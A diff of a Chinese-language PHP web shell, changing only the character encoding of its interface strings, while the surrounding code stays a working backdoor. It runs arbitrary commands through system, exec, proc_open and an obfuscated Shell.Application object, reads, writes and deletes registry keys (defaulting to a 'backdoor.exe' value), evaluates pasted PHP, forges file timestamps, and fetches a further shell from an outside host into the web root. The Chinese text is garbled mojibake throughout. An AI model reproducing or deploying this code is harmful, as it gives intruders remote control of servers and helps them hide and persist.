 		echo $code;
 		exit;
 	} else {
-		echo "ÇëÑ¡ÔñÒª´ò°üÏÂÔØµÄÎÄ¼ş!";
+		echo "è¯·é€‰æ‹©è¦æ‰“åŒ…ä¸‹è½½çš„æ–‡ä»¶!";
 	}
 }
 
-// Shell.Application ÔËĞĞ³ÌĞò
+// Shell.Application è¿è¡Œç¨‹åº
 elseif(($_POST['do'] == 'programrun') AND !empty($_POST['program'])) {
 	$shell= &new COM('Sh'.'el'.'l.Appl'.'ica'.'tion');
 	$a = $shell->ShellExecute($_POST['program'],$_POST['prog']);
-	echo ($a=='0') ? "³ÌĞòÒÑ¾­³É¹¦Ö´ĞĞ!" : "³ÌĞòÔËĞĞÊ§°Ü!";
+	echo ($a=='0') ? "ç¨‹åºå·²ç»æˆåŠŸæ‰§è¡Œ!" : "ç¨‹åºè¿è¡Œå¤±è´¥!";
 }
 
-// ²é¿´PHPÅäÖÃ²ÎÊı×´¿ö
+// æŸ¥çœ‹PHPé…ç½®å‚æ•°çŠ¶å†µ
 elseif(($_POST['do'] == 'viewphpvar') AND !empty($_POST['phpvarname'])) {
-	echo "ÅäÖÃ²ÎÊı ".$_POST['phpvarname']." ¼ì²â½á¹û: ".getphpcfg($_POST['phpvarname'])."";
+	echo "é…ç½®å‚æ•° ".$_POST['phpvarname']." æ£€æµ‹ç»“æœ: ".getphpcfg($_POST['phpvarname'])."";
 }
 
-// ¶ÁÈ¡×¢²á±í
+// è¯»å–æ³¨å†Œè¡¨
 elseif(($regread) AND !empty($_POST['readregname'])) {
 	$shell= &new COM('WSc'.'rip'.'t.Sh'.'ell');
 	var_dump(@$shell->RegRead($_POST['readregname']));
 }
 
-// Ğ´Èë×¢²á±í
+// å†™å…¥æ³¨å†Œè¡¨
 elseif(($regwrite) AND !empty($_POST['writeregname']) AND !empty($_POST['regtype']) AND !empty($_POST['regval'])) {
 	$shell= &new COM('W'.'Scr'.'ipt.S'.'hell');
 	$a = @$shell->RegWrite($_POST['writeregname'], $_POST['regval'], $_POST['regtype']);
-	echo ($a=='0') ? "Ğ´Èë×¢²á±í½¡Öµ³É¹¦!" : "Ğ´Èë ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." Ê§°Ü!";
+	echo ($a=='0') ? "å†™å…¥æ³¨å†Œè¡¨å¥å€¼æˆåŠŸ!" : "å†™å…¥ ".$_POST['regname'].", ".$_POST['regval'].", ".$_POST['regtype']." å¤±è´¥!";
 }
 
-// É¾³ı×¢²á±í
+// åˆ é™¤æ³¨å†Œè¡¨
 elseif(($regdelete) AND !empty($_POST['delregname'])) {
 	$shell= &new COM('WS'.'cri'.'pt.S'.'he'.'ll');
 	$a = @$shell->RegDelete($_POST['delregname']);
-	echo ($a=='0') ? "É¾³ı×¢²á±í½¡Öµ³É¹¦!" : "É¾³ı ".$_POST['delregname']." Ê§°Ü!";
+	echo ($a=='0') ? "åˆ é™¤æ³¨å†Œè¡¨å¥å€¼æˆåŠŸ!" : "åˆ é™¤ ".$_POST['delregname']." å¤±è´¥!";
 }
 
 else {
@@ -470,21 +470,21 @@ else {
 }
 
 echo "</b></p>\n";
-/*===================== Ö´ĞĞ²Ù×÷ ½áÊø =====================*/
+/*===================== æ‰§è¡Œæ“ä½œ ç»“æŸ =====================*/
 
 if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
 	$tb->tableheader();
 ?>
   <tr bgcolor="#cccccc">
-    <td align="center" nowrap width="27%"><b>ÎÄ¼ş</b></td>
-	<td align="center" nowrap width="16%"><b>´´½¨ÈÕÆÚ</b></td>
-    <td align="center" nowrap width="16%"><b>×îºóĞŞ¸Ä</b></td>
-    <td align="center" nowrap width="11%"><b>´óĞ¡</b></td>
-    <td align="center" nowrap width="6%"><b>ÊôĞÔ</b></td>
-    <td align="center" nowrap width="24%"><b>²Ù×÷</b></td>
+    <td align="center" nowrap width="27%"><b>æ–‡ä»¶</b></td>
+	<td align="center" nowrap width="16%"><b>åˆ›å»ºæ—¥æœŸ</b></td>
+    <td align="center" nowrap width="16%"><b>æœ€åä¿®æ”¹</b></td>
+    <td align="center" nowrap width="11%"><b>å¤§å°</b></td>
+    <td align="center" nowrap width="6%"><b>å±æ€§</b></td>
+    <td align="center" nowrap width="24%"><b>æ“ä½œ</b></td>
   </tr>
 <?php
-// Ä¿Â¼ÁĞ±í
+// ç›®å½•åˆ—è¡¨
 $dirs=@opendir($dir);
 $dir_i = '0';
 while ($file=@readdir($dirs)) {
@@ -501,13 +501,13 @@ while ($file=@readdir($dirs)) {
 			echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
 			echo "  <td align=\"center\" nowrap class=\"smlfont\">&lt;dir&gt;</td>\n";
 			echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$dirperm</a></td>\n";
-			echo "  <td align=\"center\" nowrap>| <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($file)."','ÄãÈ·¶¨ÒªÉ¾³ı $file Ä¿Â¼Âğ? \\n\\nÈç¹û¸ÃÄ¿Â¼·Ç¿Õ,´Ë´Î²Ù×÷½«»áÉ¾³ı¸ÃÄ¿Â¼ÏÂµÄËùÓĞÎÄ¼ş!','1')\">É¾³ı</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($file)."\">¸ÄÃû</a> |</td>\n";
+			echo "  <td align=\"center\" nowrap>| <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($file)."','ä½ ç¡®å®šè¦åˆ é™¤ $file ç›®å½•å—? \\n\\nå¦‚æœè¯¥ç›®å½•éç©º,æ­¤æ¬¡æ“ä½œå°†ä¼šåˆ é™¤è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶!','1')\">åˆ é™¤</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($file)."\">æ”¹å</a> |</td>\n";
 			echo "</tr>\n";
 			$dir_i++;
 		} else {
 			if($file=="..") {
 				echo "<tr class=".getrowbg().">\n";
-				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">·µ»ØÉÏ¼¶Ä¿Â¼</a></td>\n";
+				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">è¿”å›ä¸Šçº§ç›®å½•</a></td>\n";
 				echo "</tr>\n";
 			}
 		}
@@ -520,7 +520,7 @@ while ($file=@readdir($dirs)) {
 </tr>
 <FORM action="" method="POST">
 <?
-// ÎÄ¼şÁĞ±í
+// æ–‡ä»¶åˆ—è¡¨
 $dirs=@opendir($dir);
 $file_i = '0';
 while ($file=@readdir($dirs)) {
@@ -546,13 +546,13 @@ while ($file=@readdir($dirs)) {
 		echo "  <td align=\"center\" nowrap class=\"smlfont\">$mtime</td>\n";
 		echo "  <td align=\"right\" nowrap class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
 		echo "  <td align=\"center\" nowrap class=\"smlfont\"><a href=\"?action=fileperm&dir=".urlencode($dir)."&file=".urlencode($file)."\">$fileperm</a></td>\n";
-		echo "  <td align=\"center\" nowrap><a href=\"?downfile=".urlencode($filepath)."\">ÏÂÔØ</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">±à¼­</a> | <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($filepath)."','ÄãÈ·¶¨ÒªÉ¾³ı $file ÎÄ¼şÂğ?','2')\">É¾³ı</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($filepath)."\">¸ÄÃû</a> | <a href=\"?action=newtime&dir=".urlencode($dir)."&file=".urlencode($filepath)."\">Ê±¼ä</a></td>\n";
+		echo "  <td align=\"center\" nowrap><a href=\"?downfile=".urlencode($filepath)."\">ä¸‹è½½</a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">ç¼–è¾‘</a> | <a href=\"#\" onclick=\"really('".urlencode($dir)."','".urlencode($filepath)."','ä½ ç¡®å®šè¦åˆ é™¤ $file æ–‡ä»¶å—?','2')\">åˆ é™¤</a> | <a href=\"?action=rename&dir=".urlencode($dir)."&fname=".urlencode($filepath)."\">æ”¹å</a> | <a href=\"?action=newtime&dir=".urlencode($dir)."&file=".urlencode($filepath)."\">æ—¶é—´</a></td>\n";
 		echo "</tr>\n";
 		$file_i++;
 	}
 }// while
 @closedir($dirs); 
-$tb->tdbody('<table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td>'.$tb->makeinput('chkall','on','onclick="CheckAll(this.form)"','checkbox','30','').' '.$tb->makeinput('downrar','Ñ¡ÖĞÎÄ¼ş´ò°üÏÂÔØ','','submit').'</td><td align="right">'.$dir_i.' ¸öÄ¿Â¼ / '.$file_i.' ¸öÎÄ¼ş</td></tr></table>','center',getrowbg(),'','','6');
+$tb->tdbody('<table width="100%" border="0" cellpadding="2" cellspacing="0" align="center"><tr><td>'.$tb->makeinput('chkall','on','onclick="CheckAll(this.form)"','checkbox','30','').' '.$tb->makeinput('downrar','é€‰ä¸­æ–‡ä»¶æ‰“åŒ…ä¸‹è½½','','submit').'</td><td align="right">'.$dir_i.' ä¸ªç›®å½• / '.$file_i.' ä¸ªæ–‡ä»¶</td></tr></table>','center',getrowbg(),'','','6');
 
 echo "</FORM>\n";
 echo "</table>\n";
@@ -571,8 +571,8 @@ elseif ($_GET['action'] == "editfile") {
 	}
 	$action = "?dir=".urlencode($dir)."&editfile=".$editfile;
 	$tb->tableheader();
-	$tb->formheader($action,'ĞÂ½¨/±à¼­ÎÄ¼ş');
-	$tb->tdbody('µ±Ç°ÎÄ¼ş: '.$tb->makeinput('editfilename',$filename).' ÊäÈëĞÂÎÄ¼şÃûÔò½¨Á¢ĞÂÎÄ¼ş Php´úÂë¼ÓÃÜ: <input type="checkbox" name="change" value="yes" onclick="javascript:alert(\'Õâ¸ö¹¦ÄÜÖ»¿ÉÒÔÓÃÀ´¼ÓÃÜ»òÊÇÑ¹ËõÍêÕûµÄphp´úÂë¡£\\n\\n·Çphp´úÂë»ò²»ÍêÕûphp´úÂë»ò²»Ö§³Ögzinflateº¯ÊıÇë²»ÒªÊ¹ÓÃ£¡\')"> ');
+	$tb->formheader($action,'æ–°å»º/ç¼–è¾‘æ–‡ä»¶');
+	$tb->tdbody('å½“å‰æ–‡ä»¶: '.$tb->makeinput('editfilename',$filename).' è¾“å…¥æ–°æ–‡ä»¶ååˆ™å»ºç«‹æ–°æ–‡ä»¶ Phpä»£ç åŠ å¯†: <input type="checkbox" name="change" value="yes" onclick="javascript:alert(\'è¿™ä¸ªåŠŸèƒ½åªå¯ä»¥ç”¨æ¥åŠ å¯†æˆ–æ˜¯å‹ç¼©å®Œæ•´çš„phpä»£ç ã€‚\\n\\néphpä»£ç æˆ–ä¸å®Œæ•´phpä»£ç æˆ–ä¸æ”¯æŒgzinflateå‡½æ•°è¯·ä¸è¦ä½¿ç”¨ï¼\')"> ');
 	$tb->tdbody($tb->maketextarea('filecontent',$contents));
 	$tb->makehidden('do','doeditfile');
 	$tb->formfooter('1','30');
@@ -582,11 +582,11 @@ elseif ($_GET['action'] == "rename") {
 	$nowfile = (isset($_POST['newname'])) ? $_POST['newname'] : basename($_GET['fname']);
 	$action = "?dir=".urlencode($dir)."&fname=".urlencode($fname);
 	$tb->tableheader();
-	$tb->formheader($action,'ĞŞ¸ÄÎÄ¼şÃû');
+	$tb->formheader($action,'ä¿®æ”¹æ–‡ä»¶å');
 	$tb->makehidden('oldname',$dir."/".$nowfile);
 	$tb->makehidden('dir',$dir);
-	$tb->tdbody('µ±Ç°ÎÄ¼şÃû: '.basename($nowfile));
-	$tb->tdbody('¸ÄÃûÎª: '.$tb->makeinput('newname'));
+	$tb->tdbody('å½“å‰æ–‡ä»¶å: '.basename($nowfile));
+	$tb->tdbody('æ”¹åä¸º: '.$tb->makeinput('newname'));
 	$tb->makehidden('do','rename');
 	$tb->formfooter('1','30');
 }//end rename
@@ -594,7 +594,7 @@ elseif ($_GET['action'] == "rename") {
 elseif ($_GET['action'] == "eval") {
 	$action = "?dir=".urlencode($dir)."";
 	$tb->tableheader();
-	$tb->formheader(''.$action.' "target="_blank' ,'Ö´ĞĞphp½Å±¾');
+	$tb->formheader(''.$action.' "target="_blank' ,'æ‰§è¡Œphpè„šæœ¬');
 	$tb->tdbody($tb->maketextarea('phpcode',$contents));
 	$tb->formfooter('1','30');
 	
@@ -602,8 +602,8 @@ elseif ($_GET['action'] == "eval") {
 elseif ($_GET['action'] == "fileperm") {
 	$action = "?dir=".urlencode($dir)."&file=".$file;
 	$tb->tableheader();
-	$tb->formheader($action,'ĞŞ¸ÄÎÄ¼şÊôĞÔ');
-	$tb->tdbody('ĞŞ¸Ä '.$file.' µÄÊôĞÔÎª: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));
+	$tb->formheader($action,'ä¿®æ”¹æ–‡ä»¶å±æ€§');
+	$tb->tdbody('ä¿®æ”¹ '.$file.' çš„å±æ€§ä¸º: '.$tb->makeinput('fileperm',substr(base_convert(fileperms($dir.'/'.$file),10,8),-4)));
 	$tb->makehidden('file',$file);
 	$tb->makehidden('dir',urlencode($dir));
 	$tb->makehidden('do','editfileperm');
@@ -614,15 +614,15 @@ elseif ($_GET['action'] == "newtime") {
 	$action = "?dir=".urlencode($dir);
 	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
 	$tb->tableheader();
-	$tb->formheader($action,'¿ËÂ¡ÎÄ¼ş×îºóĞŞ¸ÄÊ±¼ä');
-	$tb->tdbody("ĞŞ¸ÄÎÄ¼ş: ".$tb->makeinput('curfile',$file,'readonly')." ¡ú Ä¿±êÎÄ¼ş: ".$tb->makeinput('tarfile','ĞèÌîÍêÕûÂ·¾¶¼°ÎÄ¼şÃû'),'center','2','30');
+	$tb->formheader($action,'å…‹éš†æ–‡ä»¶æœ€åä¿®æ”¹æ—¶é—´');
+	$tb->tdbody("ä¿®æ”¹æ–‡ä»¶: ".$tb->makeinput('curfile',$file,'readonly')." â†’ ç›®æ ‡æ–‡ä»¶: ".$tb->makeinput('tarfile','éœ€å¡«å®Œæ•´è·¯å¾„åŠæ–‡ä»¶å'),'center','2','30');
 	$tb->makehidden('do','domodtime');
 	$tb->formfooter('','30');
-	$tb->formheader($action,'×Ô¶¨ÒåÎÄ¼ş×îºóĞŞ¸ÄÊ±¼ä');
-	$tb->tdbody('<br><ul><li>ÓĞĞ§µÄÊ±¼ä´ÁµäĞÍ·¶Î§ÊÇ´Ó¸ñÁÖÍşÖÎÊ±¼ä 1901 Äê 12 ÔÂ 13 ÈÕ ĞÇÆÚÎå 20:45:54 µ½ 2038Äê 1 ÔÂ 19 ÈÕ ĞÇÆÚ¶ş 03:14:07<br>(¸ÃÈÕÆÚ¸ù¾İ 32 Î»ÓĞ·ûºÅÕûÊıµÄ×îĞ¡ÖµºÍ×î´óÖµ¶øÀ´)</li><li>ËµÃ÷: ÈÕÈ¡ 01 µ½ 30 Ö®¼ä, Ê±È¡ 0 µ½ 24 Ö®¼ä, ·ÖºÍÃëÈ¡ 0 µ½ 60 Ö®¼ä!</li></ul>','left');
-	$tb->tdbody('µ±Ç°ÎÄ¼şÃû: '.$file);
+	$tb->formheader($action,'è‡ªå®šä¹‰æ–‡ä»¶æœ€åä¿®æ”¹æ—¶é—´');
+	$tb->tdbody('<br><ul><li>æœ‰æ•ˆçš„æ—¶é—´æˆ³å…¸å‹èŒƒå›´æ˜¯ä»æ ¼æ—å¨æ²»æ—¶é—´ 1901 å¹´ 12 æœˆ 13 æ—¥ æ˜ŸæœŸäº” 20:45:54 åˆ° 2038å¹´ 1 æœˆ 19 æ—¥ æ˜ŸæœŸäºŒ 03:14:07<br>(è¯¥æ—¥æœŸæ ¹æ® 32 ä½æœ‰ç¬¦å·æ•´æ•°çš„æœ€å°å€¼å’Œæœ€å¤§å€¼è€Œæ¥)</li><li>è¯´æ˜: æ—¥å– 01 åˆ° 30 ä¹‹é—´, æ—¶å– 0 åˆ° 24 ä¹‹é—´, åˆ†å’Œç§’å– 0 åˆ° 60 ä¹‹é—´!</li></ul>','left');
+	$tb->tdbody('å½“å‰æ–‡ä»¶å: '.$file);
 	$tb->makehidden('curfile',$file);
-	$tb->tdbody('ĞŞ¸ÄÎª: '.$tb->makeinput('year','1984','','text','4').' Äê '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).' ÔÂ '.$tb->makeinput('data','18','','text','2').' ÈÕ '.$tb->makeinput('hour','20','','text','2').' Ê± '.$tb->makeinput('minute','00','','text','2').' ·Ö '.$tb->makeinput('second','00','','text','2').' Ãë','center','2','30');
+	$tb->tdbody('ä¿®æ”¹ä¸º: '.$tb->makeinput('year','1984','','text','4').' å¹´ '.$tb->makeselect(array('name'=>'month','option'=>$cachemonth,'selected'=>'October')).' æœˆ '.$tb->makeinput('data','18','','text','2').' æ—¥ '.$tb->makeinput('hour','20','','text','2').' æ—¶ '.$tb->makeinput('minute','00','','text','2').' åˆ† '.$tb->makeinput('second','00','','text','2').' ç§’','center','2','30');
 	$tb->makehidden('do','modmytime');
 	$tb->formfooter('1','30');
 }//end newtime
@@ -635,17 +635,17 @@ elseif ($_GET['action'] == "shell") {
 		$program = isset($_POST['program']) ? $_POST['program'] : "c:\winnt\system32\cmd.exe";
 		$prog = isset($_POST['prog']) ? $_POST['prog'] : "/c net start > ".$pathname."/log.txt";
 		echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
-		$tb->tdbody('ÎŞ»ØÏÔÔËĞĞ³ÌĞò ¡ú ÎÄ¼ş: '.$tb->makeinput('program',$program).' ²ÎÊı: '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');
+		$tb->tdbody('æ— å›æ˜¾è¿è¡Œç¨‹åº â†’ æ–‡ä»¶: '.$tb->makeinput('program',$program).' å‚æ•°: '.$tb->makeinput('prog',$prog,'','text','40').' '.$tb->makeinput('','Run','','submit'),'center','2','35');
 		$tb->makehidden('do','programrun');
 		echo "</form>\n";
 	}
  echo "<form action=\"?action=shell&dir=".urlencode($dir)."\" method=\"POST\">\n";
  if(isset($_POST['cmd'])) $cmd = $_POST['cmd'];
-	$tb->tdbody('ÌáÊ¾:Èç¹ûÊä³ö½á¹û²»ÍêÈ«,½¨Òé°ÑÊä³ö½á¹ûĞ´ÈëÎÄ¼ş.ÕâÑù¿ÉÒÔµÃµ½È«²¿ÄÚÈİ. ');
-	$tb->tdbody('proc_openº¯Êı¼ÙÉè²»ÊÇÄ¬ÈÏµÄwinntÏµÍ³Çë×ÔĞĞÉèÖÃÊ¹ÓÃ,×ÔĞĞĞŞ¸Ä¼ÇµÃĞ´ÍË³ö,·ñÔò»áÔÚÖ÷»úÉÏÁôÏÂÒ»¸öÎ´½áÊøµÄ½ø³Ì.');
-	$tb->tdbody('proc_openº¯ÊıÒªÊ¹ÓÃµÄcmd³ÌĞòµÄÎ»ÖÃ:'.$tb->makeinput('cmd',$cmd,'','text','30').'(ÒªÊÇÊÇlinuxÏµÍ³»¹ÊÇ´ó´óÃÇ×Ô¼ºĞŞ¸Ä°É)');
+	$tb->tdbody('æç¤º:å¦‚æœè¾“å‡ºç»“æœä¸å®Œå…¨,å»ºè®®æŠŠè¾“å‡ºç»“æœå†™å…¥æ–‡ä»¶.è¿™æ ·å¯ä»¥å¾—åˆ°å…¨éƒ¨å†…å®¹. ');
+	$tb->tdbody('proc_openå‡½æ•°å‡è®¾ä¸æ˜¯é»˜è®¤çš„winntç³»ç»Ÿè¯·è‡ªè¡Œè®¾ç½®ä½¿ç”¨,è‡ªè¡Œä¿®æ”¹è®°å¾—å†™é€€å‡º,å¦åˆ™ä¼šåœ¨ä¸»æœºä¸Šç•™ä¸‹ä¸€ä¸ªæœªç»“æŸçš„è¿›ç¨‹.');
+	$tb->tdbody('proc_openå‡½æ•°è¦ä½¿ç”¨çš„cmdç¨‹åºçš„ä½ç½®:'.$tb->makeinput('cmd',$cmd,'','text','30').'(è¦æ˜¯æ˜¯linuxç³»ç»Ÿè¿˜æ˜¯å¤§å¤§ä»¬è‡ªå·±ä¿®æ”¹å§)');
    $execfuncs = (substr(PHP_OS, 0, 3) == 'WIN') ? array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','wscript'=>'Wscript.Shell','proc_open'=>'proc_open') : array('system'=>'system','passthru'=>'passthru','exec'=>'exec','shell_exec'=>'shell_exec','popen'=>'popen','proc_open'=>'proc_open');
-   $tb->tdbody('Ñ¡ÔñÖ´ĞĞº¯Êı: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' ÊäÈëÃüÁî: '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));
+   $tb->tdbody('é€‰æ‹©æ‰§è¡Œå‡½æ•°: '.$tb->makeselect(array('name'=>'execfunc','option'=>$execfuncs,'selected'=>$execfunc)).' è¾“å…¥å‘½ä»¤: '.$tb->makeinput('command',$_POST['command'],'','text','60').' '.$tb->makeinput('','Run','','submit'));
 ?>
   <tr class="secondalt">
     <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
@@ -680,11 +680,11 @@ $descriptorspec = array(
 $process = proc_open("".$_POST['cmd']."", $descriptorspec, $pipes);
 if (is_resource($process)) {
 
-    // Ğ´ÃüÁî
+    // å†™å‘½ä»¤
     fwrite($pipes[0], "".$_POST['command']."\r\n");
     fwrite($pipes[0], "exit\r\n");
     fclose($pipes[0]);
-    // ¶ÁÈ¡Êä³ö
+    // è¯»å–è¾“å‡º
     while (!feof($pipes[1])) {
         echo fgets($pipes[1], 1024);
     }
@@ -714,46 +714,46 @@ elseif ($_GET['action'] == "reg") {
 	$regval = isset($_POST['regval']) ? $_POST['regval'] : 'c:\winnt\backdoor.exe';
 	$delregname = $_POST['delregname'];
 	$tb->tableheader();
-	$tb->formheader($action,'¶ÁÈ¡×¢²á±í');
-	$tb->tdbody('¼üÖµ: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','¶ÁÈ¡','','submit'),'center','2','50');
+	$tb->formheader($action,'è¯»å–æ³¨å†Œè¡¨');
+	$tb->tdbody('é”®å€¼: '.$tb->makeinput('readregname',$regname,'','text','100').' '.$tb->makeinput('regread','è¯»å–','','submit'),'center','2','50');
 	echo "</form>";
 
-	$tb->formheader($action,'Ğ´Èë×¢²á±í');
+	$tb->formheader($action,'å†™å…¥æ³¨å†Œè¡¨');
 	$cacheregtype = array('REG_SZ'=>'REG_SZ','REG_BINARY'=>'REG_BINARY','REG_DWORD'=>'REG_DWORD','REG_MULTI_SZ'=>'REG_MULTI_SZ','REG_EXPAND_SZ'=>'REG_EXPAND_SZ');
-	$tb->tdbody('¼üÖµ: '.$tb->makeinput('writeregname',$registre,'','text','56').' ÀàĞÍ: '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' Öµ:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','Ğ´Èë','','submit'),'center','2','50');
+	$tb->tdbody('é”®å€¼: '.$tb->makeinput('writeregname',$registre,'','text','56').' ç±»å‹: '.$tb->makeselect(array('name'=>'regtype','option'=>$cacheregtype,'selected'=>$regtype)).' å€¼:  '.$tb->makeinput('regval',$regval,'','text','15').' '.$tb->makeinput('regwrite','å†™å…¥','','submit'),'center','2','50');
 	echo "</form>";
 
-	$tb->formheader($action,'É¾³ı×¢²á±í');
-	$tb->tdbody('¼üÖµ: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','É¾³ı','','submit'),'center','2','50');
+	$tb->formheader($action,'åˆ é™¤æ³¨å†Œè¡¨');
+	$tb->tdbody('é”®å€¼: '.$tb->makeinput('delregname',$delregname,'','text','100').' '.$tb->makeinput('regdelete','åˆ é™¤','','submit'),'center','2','50');
 	echo "</form>";
 	$tb->tablefooter();
 }//end reg
 elseif ($_GET['action'] == "downloads"){
 $action = '?action=dir';
 	$tb->tableheader();
-	$tb->formheader($action,'httpÎÄ¼şÏÂÔØÄ£Ê½');
-	$tb->tdbody('Äã¿ÉÒÔÊ¹ÓÃ±¾¹¦ÄÜ°ÑÒ»Ğ©Ğ¡¹¤¾ßÒÔhttp·½Ê½ÏÂÔØµ½´Ë·şÎñÆ÷','center');
-	$tb->tdbody('ÎÄ¼şÎ»ÖÃ: '.$tb->makeinput('durl','http://blog.blackwoods.com/miyabi/myshell.txt','','text','70').'<br>ÏÂÔØµ½:'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','ÏÂÔØ','','submit'),'center','1','35');
+	$tb->formheader($action,'httpæ–‡ä»¶ä¸‹è½½æ¨¡å¼');
+	$tb->tdbody('ä½ å¯ä»¥ä½¿ç”¨æœ¬åŠŸèƒ½æŠŠä¸€äº›å°å·¥å…·ä»¥httpæ–¹å¼ä¸‹è½½åˆ°æ­¤æœåŠ¡å™¨','center');
+	$tb->tdbody('æ–‡ä»¶ä½ç½®: '.$tb->makeinput('durl','http://blog.blackwoods.com/miyabi/myshell.txt','','text','70').'<br>ä¸‹è½½åˆ°:'.$tb->makeinput('path','./myshell.php','','text','60').''.$tb->makehidden('do','downloads').''.$tb->makeinput('','ä¸‹è½½','','submit'),'center','1','35');
 	echo "</form>";
-	$tb->tdbody('×¢Òâ,¼ÙÉèÎÄ¼şÌ«´ó½«ÎŞ·¨ÏÂÔØÏÂÀ´¶øÇÒÓ°ÏìÖ´ĞĞËÙ¶È.','center');
+	$tb->tdbody('æ³¨æ„,å‡è®¾æ–‡ä»¶å¤ªå¤§å°†æ— æ³•ä¸‹è½½ä¸‹æ¥è€Œä¸”å½±å“æ‰§è¡Œé€Ÿåº¦.','center');
 	$tb->tablefooter();
 }
 elseif ($_GET['action'] == "search"){
 $action = '?dir='.$dir.'';
 	$tb->tableheader();
-	$tb->formheader($action,'ÎÄ¼ş²éÕÒ');
-	$tb->tdbody('Äã¿ÉÒÔÊ¹ÓÃ±¾¹¦ÄÜ²éÕÒÒ»¸öÄ¿Â¼ÏÂµÄÎÄ¼şÀïÄÄĞ´ÎÄ¼ş°üº¬×Å¹Ø¼ü´Ê!','center');
-	$tb->tdbody('ÎÄ¼şÎ»ÖÃ: '.$tb->makeinput('path',''.$nowpath.'','','text','70').'<br>²éÕÒÎÄ×Ö:'.$tb->makeinput('oldkey','ÏÂ¼ú','','text','60').''.$tb->makehidden('do','search').'<br> ÊÇ·ñ¼ÆËãËùÔÚĞĞ<input type="checkbox" name="type" value="list" onclick="javascript:alert(\'Ñ¡¶¨´Ë´¦½«»áÁĞ³ö¹Ø¼ü´ÊÔÚËùÔÚÎÄ¼şµÄ¶àÉÙĞĞ,ºÍËùÔÚµÄÄÇÎÄ¼şÓĞ¶àÉÙĞĞ½øĞĞ±È¶Ô\\n\\n¸ñÊ½Îª:[ËùÔÚĞĞ/ÎÄ¼ş×ÜĞĞ]ÀıÈç[12/99],ÓÃÀ´½øĞĞ·ÖÎö.\\n\\n´Ë¹¦ÄÜ¿ÉÄÜ»áÔö¼ÓÒ»²¿·ÖµÄÑÓÊ±,Çë¿¼ÂÇÊ¹ÓÃ,Ã»ÓĞ¿É¶ÁÈ¨ÏŞ½«³ö´í!\')"> (´Ë¹¦ÄÜºÍÏÂÃæÒ»¸ö¹¦ÄÜ»áÓ°ÏìÖ´ĞĞËÙ¶È£¬ËùÒÔÄ¬ÈÏ¹Ø±Õ!) <br>ÊÊµ±¶ÁÈ¡:<input type="checkbox" name="type2" value="getpath" onclick="javascript:alert(\'Ñ¡¶¨´Ë´¦½«»áÁĞ³ö¹Ø¼ü´ÊÔÚËùÔÚÎ»ÖÃ¼°ÄãÉè¶¨½áÊøÇøÓòÄÚµÄ²¿·Ö×Ö·û..\\n\\n²ÉÈ¡´Ë¹¦ÄÜ²éÕÒÍêÎÄ¼şºó°ÑÊó±êÒÆ¶¯µ½ÕÒµ½µÄÎÄ¼şÃûÉÏ¼´¿É¶ÁÈ¡·ÖÎö....\\n\\n´Ë¹¦ÄÜ¿ÉÄÜ»áÔö¼ÓÒ»²¿·ÖµÄÑÓÊ±,Çë¿¼ÂÇÊ¹ÓÃ,Ã»ÓĞ¿É¶ÁÈ¨ÏŞ½«³ö´í!\')"> ¶ÁÈ¡¹Ø¼ü´ÊÇ°'.$tb->makeinput('beline','0','','text','3').'¸ö×Ö·û '.$tb->makehidden('dir',''.$dir.'').'µ½¹Ø¼ü´ÊºóµÚ'.$tb->makeinput('endline','10','','text','3').'¸ö×Ö·û... '.$tb->makehidden('dir',''.$dir.'').''.$tb->makeinput('','¿ªÊ¼²éÕÒÎÄ¼ş','','submit'),'center','1','35');
+	$tb->formheader($action,'æ–‡ä»¶æŸ¥æ‰¾');
+	$tb->tdbody('ä½ å¯ä»¥ä½¿ç”¨æœ¬åŠŸèƒ½æŸ¥æ‰¾ä¸€ä¸ªç›®å½•ä¸‹çš„æ–‡ä»¶é‡Œå“ªå†™æ–‡ä»¶åŒ…å«ç€å…³é”®è¯!','center');
